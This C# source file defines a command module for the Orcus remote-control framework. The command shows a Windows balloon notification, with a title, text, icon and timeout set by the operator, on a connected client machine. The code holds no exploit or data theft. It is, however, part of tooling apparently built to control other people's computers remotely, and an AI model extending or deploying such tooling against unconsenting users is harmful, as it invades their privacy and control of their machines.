using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.Interaction
{
    public class ShowBalloonTooltipCommand : StaticCommand
    {
        public ShowBalloonTooltipCommand()
        {
            this.RegisterProperty(() => Title, Resources.StaticCommands.Title, Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Title_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => Text, Resources.StaticCommands.Text, Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Text_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => Timeout, Resources.StaticCommands.Timeout,
                    Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Timeout_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => ToolTipIcon, Resources.StaticCommands.Icon, Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Icon_Description,
                    Resources.StaticCommands.Common);
        }

        public override Guid CommandId { get; } = new Guid(0x7e475538, 0xa3e6, 0x6b48, 0xbc, 0x7a, 0xb8, 0x8e, 0x23,
            0xf8, 0xf8, 0xa0);

        public override string Name { get; } = Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.UserInteraction;

        [NumericValue(Minimum = 2000, StringFormat = "0 ms")]
        public int Timeout { get; set; } = 10000;

        public string Title { get; set; }
        public string Text { get; set; }
        public ToolTipIcon ToolTipIcon { get; set; } = ToolTipIcon.None;

        public override InputValidationResult ValidateInput()
        {
            if (Text.IsNullOrWhiteSpace())
                return InputValidationResult.Error(Resources.StaticCommands.Interaction_ShowBalloonTooltipCommand_ValidateInput_TextCannotBeEmpty);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            using (var notifyIcon = new NotifyIcon {Icon = SystemIcons.Application})
            {
                notifyIcon.Visible = true;
                notifyIcon.ShowBalloonTip(Timeout, Title, Text, ToolTipIcon);
                Thread.Sleep(Timeout);
            }
        }
    }
}